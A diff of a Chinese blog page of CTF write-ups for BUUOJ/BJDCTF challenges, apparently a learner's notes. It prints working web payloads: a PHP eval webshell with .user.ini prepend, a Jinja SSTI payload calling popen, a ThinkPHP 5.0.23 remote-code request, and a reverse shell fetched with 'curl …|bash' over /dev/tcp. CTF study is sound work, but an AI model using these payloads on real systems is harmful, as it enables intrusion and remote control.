@@ -58,11 +58,12 @@
 <meta property="og:site_name" content="Gee">
 <meta property="og:description" content="1.checkin一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&amp;lt;?,被过滤了，改一下脚本1&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;gt;改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;19&#x2F;buuoj%E5%88%B7%E9%A2%98&#x2F;2.jpg">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;19&#x2F;buuoj%E5%88%B7%E9%A2%98&#x2F;1.jpg">
-<meta property="og:updated_time" content="2020-03-19T13:26:10.021Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
+<meta property="og:updated_time" content="2020-03-29T14:01:13.507Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;19&#x2F;buuoj%E5%88%B7%E9%A2%98&#x2F;2.jpg">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;19&#x2F;buuoj%E5%88%B7%E9%A2%98&#x2F;1.jpg">
 
 <link rel="canonical" href="http://yoursite.com/2020/03/19/buuoj%E5%88%B7%E9%A2%98/">
 
@@ -229,10 +230,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-03-19 20:09:59 / 修改时间：21:26:10" itemprop="dateCreated datePublished" datetime="2020-03-19T20:09:59+08:00">2020-03-19</time>
+              <time title="创建时间：2020-03-19 20:09:59" itemprop="dateCreated datePublished" datetime="2020-03-19T20:09:59+08:00">2020-03-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-29 22:01:13" itemprop="dateModified" datetime="2020-03-29T22:01:13+08:00">2020-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -261,7 +268,27 @@
 
 <p>于是我们可以这样子，先上传一个.user.ini ，其内容为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=webshell.jpg</span><br></pre></td></tr></table></figure>
-<p>然后在上传我们的一句话木马<br><img src="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/2.jpg" alt><br>访问index.php可以看到，我们的webshell.jpg已经被当作php文件中执行了<br><img src="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/1.jpg" alt><br>最后system(“cat /flag”);拿到flag</p>
+<p>然后在上传我们的一句话木马</p>
+
+<p>访问index.php可以看到，我们的webshell.jpg已经被当作php文件中执行了<br><img src="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/1.jpg" alt><br>最后system(“cat /flag”);拿到flag</p>
+<p>这几天做了一下BUUOJ上的BJDCTF的题目，写一下自己的wp</p>
+<p>1.fake google<br>查看源代码，提示是SSTI注入，这就好办了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>查看可用的类，发现有一个os._wrap_close的类，这个是可以供我们使用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;ls /&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7178.JPG" alt><br>查看根目录，发现flag就在根目录下，于是最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;ls&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7178.JPG" alt><br>2.old hack<br>这道题告诉了我们tp的版本是5.023，应该是想让我们用现成的漏洞吧，找了篇复现这个漏洞的文章<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a><br>利用方式是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip_addr/index.php?s=captcha</span><br><span class="line">(post)_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls /</span><br></pre></td></tr></table></figure>
+<p>列出了根目录，然后直接查看flag即可<br>3.duangshell<br>下载备份文件后，拿到了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&apos;girl_friend&apos;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&apos;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl = $_POST[&apos;];</span><br><span class="line">    if (preg_match(&apos;/\&gt;|\\\/&apos;, $girl)) &#123;</span><br><span class="line">        die(&apos;just girl&apos;);</span><br><span class="line">    &#125; else if (preg_match(&apos;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&apos;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src=&apos;img/p3_need_beautiful_gf.png&apos;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现过滤了一堆东西，于是就想着用反弹shell试试，结合前面的提示，开个小号，新建一个靶机，因为这道题过滤了一堆东西，所以直接写一句话反弹shell肯定行不通，所以我们可以利用curl命令<br>现在新开的靶机中在/var/www/html下新建一个shell.txt文件,然后将一句话反弹shell写进去;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>然后再把靶机上监听相应的端口，再给girl_friend传值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ipaddr/shell.txt|bash</span><br></pre></td></tr></table></figure>
+<p>成功反弹shell，然后这道题根目录下的flag是假的，用find命令查找flag即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name “flag”</span><br></pre></td></tr></table></figure>
+<p>4.假猪套天下第一<br>这道题随便输用户名密码登陆后有个跳转，抓包看看有提示L0g1in.php，然后就是根据他的提示一步步的补充修改http headrs即可</p>
 
     </div>
 
